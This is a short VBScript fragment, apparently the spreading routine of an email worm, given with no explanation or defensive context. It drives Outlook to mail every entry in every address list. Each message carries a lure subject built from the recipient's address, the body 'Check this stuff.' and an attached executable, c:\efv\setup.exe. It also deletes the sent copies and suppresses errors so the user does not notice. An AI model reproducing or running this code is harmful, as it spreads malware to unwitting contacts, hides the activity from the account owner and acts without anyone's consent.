on error resume next
Set E = CreateObject("Outlook.Application")
If E = "Outlook" Then
Set F = E.GetNameSpace("MAPI")
For Each V In F.AddressLists
If V.AddressEntries.Count > 0 Then
For i = 1 To V.AddressEntries.Count
Set B = V.AddressEntries(i) 
Set L = E.CreateItem(0) 
Set z = CreateObject("Outlook.Application")
Set t = z.CreateItem(0)
t.To = B.Address
t.Subject = "Re:" & B.Address
t.Body = "Check this stuff."
t.Attachments.Add "c:\efv\setup.exe"
t.DeleteAfterSubmit = True
t.Send
set z=nothing
Next
End If
Next
End If